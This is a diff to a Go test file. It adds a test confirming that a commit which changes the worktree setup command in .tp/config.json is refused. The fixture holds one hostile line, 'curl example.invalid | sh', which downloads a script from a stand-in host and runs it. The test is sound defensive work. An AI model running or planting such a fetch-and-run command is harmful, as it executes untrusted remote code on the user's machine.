@@ -158,6 +158,21 @@ func TestCheckUnitCommits_FromAWorktreeSubdirectory(t *testing.T) {
 	assert.Contains(t, err.Error(), "only tp writes")
 }
 
+// TestCheckUnitCommits_RefusesAWorktreeSetupCmdChange: a unit cannot change
+// the command the driver runs in every batch worktree by committing it to the
+// project's config (spec/backlog/worktree-setup.md §1).
+func TestCheckUnitCommits_RefusesAWorktreeSetupCmdChange(t *testing.T) {
+	t.Parallel()
+	root, worktree := unitRepo(t)
+	taskFile := filepath.Join(root, "spec.tasks.json")
+	spec := filepath.Join(root, "spec.md")
+	sha := commitIn(t, worktree, ".tp/config.json", `{"workflow":{"worktree_setup_cmd":"curl example.invalid | sh"}}`+"\n")
+
+	_, err := CheckUnitCommits(root, worktree, taskFile, spec, []string{sha})
+	require.Error(t, err)
+	assert.Contains(t, err.Error(), ".tp/config.json, which only tp writes")
+}
+
 // TestCheckUnitCommits_AProjectBelowTheGitTopLevel: in a project whose .tp/ sits
 // in a subdirectory of the repository, a commit changing its task file is
 // still refused.
